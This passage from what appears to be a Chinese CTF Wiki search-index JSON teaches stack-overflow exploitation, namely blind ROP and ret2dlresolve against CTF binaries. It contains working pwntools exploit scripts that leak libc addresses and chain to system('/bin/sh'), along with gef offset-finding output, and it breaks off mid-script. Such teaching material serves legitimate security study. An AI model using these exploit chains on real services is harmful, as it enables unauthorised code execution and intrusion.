\u6700\u540e\uff0c\u6211\u4eec\u5c06\u6cc4\u9732\u7684\u5185\u5bb9\u5199\u5230\u6587\u4ef6\u91cc\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u6cc4\u9732\u51fa\u6765\u7684\u662f\u201c\u201d,\u90a3\u8bf4\u660e\u6211\u4eec\u9047\u5230\u4e86'\\x00'\uff0c\u56e0\u4e3aputs\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u662f\u4ee5'\\x00'\u4e3a\u7ec8\u6b62\u7b26\u7684\u3002\u4e4b\u540e\u5229\u7528ida\u6253\u5f00binary\u6a21\u5f0f\uff0c\u9996\u5148\u5728edit- segments- rebase program \u5c06\u7a0b\u5e8f\u7684\u57fa\u5730\u5740\u6539\u4e3a0x400000\uff0c\u7136\u540e\u627e\u5230\u504f\u79fb0x560\u5904\uff0c\u5982\u4e0b  seg000: 0000000000400560                   db   0 FFh  seg000: 0000000000400561                   db    25 h   ; %  seg000 : 0000000000400562                   db   0 B2h   ;   seg000 : 0000000000400563                   db    0 Ah  seg000: 0000000000400564                   db    20 h  seg000: 0000000000400565                   db      0   \u7136\u540e\u6309\u4e0bc,\u5c06\u6b64\u5904\u7684\u6570\u636e\u8f6c\u6362\u4e3a\u6c47\u7f16\u6307\u4ee4\uff0c\u5982\u4e0b  seg000: 0000000000400560   ; ---------------------------------------------------------------------------  seg000: 0000000000400560                   jmp       qword   ptr   cs : 601018 h  seg000: 0000000000400566   ; ---------------------------------------------------------------------------  seg000: 0000000000400566                   push      0  seg000: 000000000040056 B                   jmp       loc_400550  seg000: 000000000040056 B   ; ---------------------------------------------------------------------------   \u8fd9\u8bf4\u660e\uff0cputs@got\u7684\u5730\u5740\u4e3a0x601018\u3002", 
            "title": "\u6cc4\u9732puts@got\u5730\u5740"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_17", 
            "text": "##length = getbufferflow_length()  length   =   72  ##stop_gadget = get_stop_addr(length)  stop_gadget   =   0x4006b6  ##brop_gadget = find_brop_gadget(length,stop_gadget)  brop_gadget   =   0x4007ba  rdi_ret   =   brop_gadget   +   9  ##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)  puts_plt   =   0x400560  ##leakfunction(length, rdi_ret, puts_plt, stop_gadget)  puts_got   =   0x601018  sh   =   remote ( 127.0.0.1 ,   9999 )  sh . recvuntil ( password? \\n )  payload   =   a   *   length   +   p64 ( rdi_ret )   +   p64 ( puts_got )   +   p64 ( puts_plt )   +   p64 ( \n     stop_gadget )  sh . sendline ( payload )  data   =   sh . recvuntil ( \\n WelCome ,   drop = True )  puts_addr   =   u64 ( data . ljust ( 8 ,   \\x00 ))  libc   =   LibcSearcher ( puts ,   puts_addr )  libc_base   =   puts_addr   -   libc . dump ( puts )  system_addr   =   libc_base   +   libc . dump ( system )  binsh_addr   =   libc_base   +   libc . dump ( str_bin_sh )  payload   =   a   *   length   +   p64 ( rdi_ret )   +   p64 ( binsh_addr )   +   p64 ( \n     system_addr )   +   p64 ( stop_gadget )  sh . sendline ( payload )  sh . interactive ()   \u53c2\u8003\u9605\u8bfb   http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/  http://bobao.360.cn/learning/detail/3694.html  http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/", 
            "title": "\u7a0b\u5e8f\u5229\u7528"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/", 
            "text": "\u9ad8\u7ea7ROP\n\n\n\u9ad8\u7ea7ROP\u5176\u5b9e\u548c\u4e00\u822c\u7684ROP\u57fa\u672c\u4e00\u6837\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5b83\u5229\u7528\u4e86\u4e00\u4e9b\u66f4\u52a0\u5e95\u5c42\u7684\u539f\u7406\u3002\n\n\nret2_dl_runtime_resolve\n\n\n\u539f\u7406\n\n\n\u8981\u60f3\u5f04\u61c2\u8fd9\u4e2aROP\u5229\u7528\u6280\u5de7\uff0c\u9700\u8981\u9996\u5148\u7406\u89e3ELF\u6587\u4ef6\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7684\u57fa\u672c\u8fc7\u7a0b\uff0c\u8bf7\u53c2\u8003executable\u4e2delf\u5bf9\u5e94\u7684\u4ecb\u7ecd\u3002\u8fd9\u91cc\u6211\u53ea\u7ed9\u51fa\u76f8\u5e94\u7684\u5229\u7528\u65b9\u5f0f\u3002\n\n\n\u6211\u4eec\u77e5\u9053\u5728linux\u4e2d\u662f\u5229\u7528_dl_runtime_resolve(link_map_obj, reloc_index)\u6765\u5bf9\u52a8\u6001\u94fe\u63a5\u7684\u51fd\u6570\u8fdb\u884c\u91cd\u5b9a\u4f4d\u7684\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76f8\u5e94\u7684\u53c2\u6570\u4ee5\u53ca\u5176\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u6790\u7684\u51fd\u6570\u4e86\u5462\uff1f\u7b54\u6848\u8fd8\u80af\u5b9a\u7684\u3002\u5177\u4f53\u5229\u7528\u65b9\u5f0f\u5982\u4e0b\n\n\n\n\n\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\n\n\n\u7ed9\u5b9aLink_map\u4ee5\u53caindex\u4e24\u4e2a\u53c2\u6570\u3002\n\n\n\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7ed9\u5b9a plt0\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u5c31\u53ea\u9700\u8981\u4e00\u4e2aindex\u5c31\u8db3\u591f\u4e86\u3002\n\n\n\n\n\n\n\u63a7\u5236index\u7684\u5927\u5c0f\uff0c\u4ee5\u4fbf\u4e8e\u6307\u5411\u81ea\u5df1\u6240\u63a7\u5236\u7684\u533a\u57df\uff0c\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u6307\u5b9a\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002\n\n\n\u4f2a\u9020\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f7f\u5f97\u91cd\u5b9a\u4f4d\u8868\u9879\u6240\u6307\u7684\u7b26\u53f7\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002\n\n\n\u4f2a\u9020\u7b26\u53f7\u5185\u5bb9\uff0c\u4f7f\u5f97\u7b26\u53f7\u5bf9\u5e94\u7684\u540d\u79f0\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002\n\n\n\n\n\u6b64\u5916\uff0c\u8fd9\u4e2a\u653b\u51fb\u6210\u529f\u7684\u5f88\u5fc5\u8981\u7684\u6761\u4ef6\n\n\n\n\ndl_resolve\u51fd\u6570\u4e0d\u4f1a\u68c0\u67e5\u5bf9\u5e94\u7684\u7b26\u53f7\u662f\u5426\u8d8a\u754c\uff0c\u5b83\u53ea\u4f1a\u6839\u636e\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u6570\u636e\u6765\u6267\u884c\u3002\n\n\ndl_resolve\u51fd\u6570\u6700\u540e\u7684\u89e3\u6790\u6839\u672c\u4e0a\u4f9d\u8d56\u4e8e\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\n\n\u6ce8\u610f\uff1a\n\n\n\n\n\u7b26\u53f7\u7248\u672c\u4fe1\u606f\n\n\n\u6700\u597d\u4f7f\u5f97ndx = VERSYM[ (reloc-\nr_info) \n 8] \u7684\u503c\u4e3a0\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u627e\u4e0d\u5230\u7684\u60c5\u51b5\u3002\n\n\n\n\n\n\n\u91cd\u5b9a\u4f4d\u8868\u9879\n\n\nr_offset\u5fc5\u987b\u662f\u53ef\u5199\u7684\uff0c\u56e0\u4e3a\u5f53\u89e3\u6790\u5b8c\u51fd\u6570\u540e\uff0c\u5fc5\u987b\u628a\u76f8\u5e94\u51fd\u6570\u7684\u5730\u5740\u586b\u5165\u5230\u5bf9\u5e94\u7684\u5730\u5740\u3002\n\n\n\n\n\n\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\n\u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u8fd9\u4e2a\u5229\u7528\u6280\u5de7\u5176\u5b9e\u8fd8\u662fROP\uff0c\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7NX\u548cASLR\u4fdd\u62a4\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u653b\u51fb\u66f4\u9002\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4f46\u540c\u65f6\u53c8\u96be\u4ee5\u6cc4\u9732\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u3002\n\n\n\u793a\u4f8b\n\n\n\u8fd9\u91cc\u4ee5XDCTF 2015\u7684pwn200\u4e3a\u4f8b\u3002\u4e3b\u8981\u53c2\u8003\n\n\n\n\nhttp://pwn4.fun/2016/11/09/Return-to-dl-resolve/\n \uff0c\u6df1\u5165\u6d45\u51fa\u3002\n\n\nhttps://www.math1as.com/index.php/archives/341/\n\n\n\n\n\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7f16\u8bd1\u4e0bret2dlresolve\u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6main.c\u6587\u4ef6\u5f97\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd9\u91cc\u53d6\u6d88\u4e86Canary\u4fdd\u62a4\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 gcc main.c -m32 -fno-stack-protector -o main\n\n\n\n\n\u5728\u4e0b\u9762\u7684\u8bb2\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4f1a\u6309\u7167\u4ee5\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u8bb2\u89e3\u3002\u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u662f\u53ef\u4ee5\u4ed4\u7ec6\u7406\u89e3ret2dlresolve\u7684\u539f\u7406\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5219\u662f\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684\u5de5\u5177\uff0c\u76f8\u5bf9\u5bb9\u6613\u4e00\u70b9\u3002\n\n\n\n\n\u5229\u7528\u6b63\u5e38\u7684\u4ee3\u7801\u6765\u4f7f\u7528\u8be5\u6280\u5de7\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\nstage 1 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u7684\u6548\u679c\u3002\n\n\nstage 2 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u6b63\u5e38write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002\n\n\nstage 3 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u4f2a\u9020\u7684write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002\n\n\n\n\n\n\n\u5229\u7528roputils\u4e2d\u5df2\u7ecf\u96c6\u6210\u597d\u7684\u5de5\u5177\u6765\u5b9e\u73b0\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\n\n\n\u6b63\u5e38\u653b\u51fb\n\n\n\u663e\u7136\u6211\u4eec\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u3002\u8fd9\u9898\u6211\u4eec\u4e0d\u8003\u8651\u6211\u4eec\u6709libc\u7684\u60c5\u51b5\u3002\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5206\u6790\u51fa\u504f\u79fb\u4e3a112\u3002\n\n\ngef\n\u27a4\n  \npattern\n \ncreate\n \n200\n\n\n[+]\n \nGenerating\n \na\n \npattern\n \nof\n \n200\n \nbytes\n\n\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\n\n[+]\n \nSaved\n \nas\n \n$_gef0\n\n\ngef\n\u27a4\n  \nr\n\n\nStarting\n \nprogram\n:\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nret2dlresolve\n/\nmain\n \n\nWelcome\n \nto\n \nXDCTF2015\n~\n!\n\n\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\n\n\nProgram\n \nreceived\n \nsignal\n \nSIGSEGV\n,\n \nSegmentation\n \nfault.\n\n\n0\nx62616164\n \nin\n \n??\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nregisters\n \n]\n\u2500\u2500\u2500\u2500\n\n\n$eax\n   \n:\n \n0x000000c9\n\n\n$ebx\n   \n:\n \n0x00000000\n\n\n$ecx\n   \n:\n \n0xffffcc6c\n  \n\u2192\n  \naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n[...]\n\n\n$edx\n   \n:\n \n0x00000100\n\n\n$esp\n   \n:\n \n0xffffcce0\n  \n\u2192\n  \neaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa\n[...]\n\n\n$ebp\n   \n:\n \n0x62616163\n \n(\ncaab\n?\n)\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xffffcd50\n  \n\u2192\n  \n0xffffcd70\n  \n\u2192\n  \n0x00000001\n\n\n$eip\n   \n:\n \n0x62616164\n \n(\ndaab\n?\n)\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nzero\n \nSIGN\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nRESUME\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[!]\n \nCannot\n \ndisassemble\n \nfrom\n \n$PC\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcce0\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcce0\n\u2502+\n0x00\n:\n \neaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa\n[...]\n  \n\u2190\n \n$esp\n\n\n0\nxffffcce4\n\u2502+\n0x04\n:\n \nfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra\n[...]\n\n\n0\nxffffcce8\n\u2502+\n0x08\n:\n \ngaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa\n[...]\n\n\n0\nxffffccec\n\u2502+\n0x0c\n:\n \nhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta\n[...]\n\n\n0\nxffffccf0\n\u2502+\n0x10\n:\n \niaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua\n[...]\n\n\n0\nxffffccf4\n\u2502+\n0x14\n:\n \njaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva\n[...]\n\n\n0\nxffffccf8\n\u2502+\n0x18\n:\n \nkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa\n[...]\n\n\n0\nxffffccfc\n\u2502+\n0x1c\n:\n \nlaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa\n[...]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \npattern\n \nsearch\n \n\n[!]\n \nSyntax\n\n\npattern\n \nsearch\n \nPATTERN\n \n[\nSIZE\n]\n\n\ngef\n\u27a4\n  \npattern\n \nsearch\n \n0x62616164\n\n\n[+]\n \nSearching\n \n0x62616164\n\n\n[+]\n \nFound\n \nat\n \noffset\n \n112\n \n(\nlittle-endian\n \nsearch\n)\n \nlikely\n\n\n\n\n\nstage 1\n\n\n\u8fd9\u91cc\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u76f4\u63a5\u6267\u884cwrite\u51fd\u6570\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u4e00\u4e2a\u66f4\u52a0\u590d\u6742\u7684\u529e\u6cd5\uff0c\u5373\u4f7f\u7528\u6808\u8fc1\u79fb\u7684\u6280\u5de7\uff0c\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u6765\u63a7\u5236write\u51fd\u6570\u3002\u5373\u4e3b\u8981\u5206\u4e3a\u4e24\u6b65\n\n\n\n\n\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u3002\n\n\n\u63a7\u5236write\u51fd\u6570\u8f93\u51fa\u76f8\u5e94\u5b57\u7b26\u4e32\u3002\n\n\n\n\n\u8fd9\u91cc\u4e3b\u8981\u4f7f\u7528\u4e86pwntools\u4e2d\u7684ROP\u6a21\u5757\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack pivoting to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack pivoting, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write cmd=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\nrop\n.\nwrite\n(\n1\n,\n \nbase_stage\n \n+\n \n80\n,\n \nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage1.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n120912\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 2\n\n\n\u5728\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u4f1a\u5229\u7528dlresolve\u76f8\u5173\u7684\u77e5\u8bc6\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u5229\u7528plt[0]\u4e2d\u7684\u76f8\u5173\u6307\u4ee4\uff0c\u5373push linkmap\u4ee5\u53ca\u8df3\u8f6c\u5230dl_resolve\u51fd\u6570\u4e2d\u89e3\u6790\u7684\u6307\u4ee4\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5f97\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2awrite\u91cd\u5b9a\u4f4d\u9879\u5728plt\u8868\u4e2d\u7684\u504f\u79fb\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n 